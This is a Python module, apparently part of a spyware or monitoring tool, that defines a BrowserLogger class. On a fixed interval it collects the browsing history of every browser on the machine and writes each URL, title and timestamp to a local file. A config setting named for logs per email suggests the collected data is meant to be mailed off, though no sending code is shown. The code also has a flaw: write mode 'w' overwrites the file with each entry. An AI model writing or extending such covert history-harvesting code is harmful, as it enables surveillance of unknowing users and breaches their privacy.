import browserhistory
import time

from config.config import BROWSER_LOG_INTERVAL, BROWSER_LOGS_PER_EMAIL
from core.utils.logging_utils import log_data, log_error


class BrowserLogger:
    def __init__(self):
        self.log_file = "browser.txt"
        self.interval = BROWSER_LOG_INTERVAL
        self.running = True

    def log_browser(self):
        browser_histroy = browserhistory.get_browserhistory()
        if browser_histroy:
            for browser, history in browser_histroy.items():
                for search in history:
                    log_data(
                        self.log_file, f"{search[2]}: {search[1]} ({search[0]})", "w"
                    )

    def run(self):
        try:
            while self.running:
                self.log_browser()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)
